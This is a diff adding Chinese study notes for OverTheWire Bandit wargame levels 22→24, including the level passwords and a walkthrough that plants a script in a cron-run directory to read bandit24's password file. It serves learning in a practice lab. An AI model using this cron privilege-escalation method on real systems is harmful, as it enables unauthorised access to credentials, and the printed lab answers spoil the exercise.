@@ -477,7 +477,7 @@
 
   cat /tmp/8ca319486bfbbc3663ea0fbe81326349    # 读密码
   ```
-- **密码**：`（填你拿到的 bandit23 密码）`
+- **密码**：`gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw`
 - **学到**：
 
   **① 脚本里的关键三行**
@@ -512,3 +512,58 @@
   - 一开始在查 `cronjob_bandit22`（上一关的配置）→ 注意**当前身份决定了要找哪一关的文件**
   - `cat /tmp/xxx` 找不到 → 文件名要**自己算**的，不能猜；或等 1 分钟让 cron 跑一次
   - 忘了 `cut -d ' ' -f 1` → 拿到的字符串后面带 `  -`，路径会错
+
+## Level 23 → 24
+
+- **目标**：cron 以 bandit24 身份运行 `/var/spool/bandit24/foo/` 目录下的**所有脚本**，需要往里放一个"自己的脚本"，让它把密码复制到我读得到的地方
+- **命令**：
+  ```bash
+  ssh bandit23@bandit.labs.overthewire.org -p 2220
+
+  cat /etc/cron.d/cronjob_bandit24          # 看任务配置
+  cat /usr/bin/cronjob_bandit24.sh          # 看脚本（关键：它遍历哪个目录）
+  ls -ld /var/spool/bandit24/foo            # 看这个目录我能不能写
+
+  # 建自己的脚本
+  cd /var/spool/bandit24/foo
+  cat > myjob.sh <<'EOF'
+  #!/bin/bash
+  cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass
+  chmod 644 /tmp/bandit24_pass
+  EOF
+  chmod 755 myjob.sh                        # 脚本必须可执行，否则 cron 跑不了
+
+  # 等 1 分钟（cron 每分钟执行）
+  cat /tmp/bandit24_pass
+  ```
+- **密码**：`hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv`
+- **学到**：
+
+  **① 这关和上一关的本质区别**
+
+  | 关卡 | 谁产出密码 |
+  |---|---|
+  | 22→23 | **别人的脚本**写文件，我去读 |
+  | 23→24 | **我写脚本**，让 cron 用高权限身份执行它 |
+
+  **这是真正的"提权"思路**：找到一个"高权限会执行我提供的代码"的位置。
+
+  **② 判断提权点的三问**
+  ```
+  ① 有没有以高权限运行的定时任务？   → cat /etc/cron.d/*
+  ② 它执行的目录/脚本，我能写吗？     → ls -ld 目录
+  ③ 我的脚本执行后能把结果放到哪？   → /tmp（所有人可读）
+  ```
+
+  **③ 必须 chmod 755**
+  - cron 只执行**可执行**的脚本，权限不够会被静默跳过
+  - 也不要设 777（虽然能用，但没必要，说明你不懂最小权限）
+
+  **④ 为什么要等**
+  - cron 是 `* * * * *`（每分钟），脚本不会立刻执行
+  - 所以"写完没反应"是正常的，等 60 秒
+
+- **解题思路**
+**写一个 shell 脚本放到这个目录，它会自动用 bandit24 的权限跑**，我们就可以让它读取 `/etc/bandit_pass/bandit24`，把密码写到 /tmp 
+
+- **踩坑记录**：
